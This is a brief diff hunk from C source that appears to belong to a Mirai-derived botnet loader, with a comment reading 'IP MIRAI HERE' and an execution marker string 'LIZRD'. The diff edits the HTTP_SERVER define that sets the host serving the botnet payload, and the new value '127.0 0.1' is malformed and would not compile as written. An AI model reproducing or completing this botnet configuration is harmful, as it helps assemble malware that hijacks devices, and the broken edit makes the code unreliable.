@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(0,0,0,0) //IP MIRAI HERE
+#define HTTP_SERVER utils_inet_addr(127.0 0.1) //IP MIRAI HERE
 
 #define EXEC_MSG            "LIZRD\n"
 #define EXEC_MSG_LEN        6
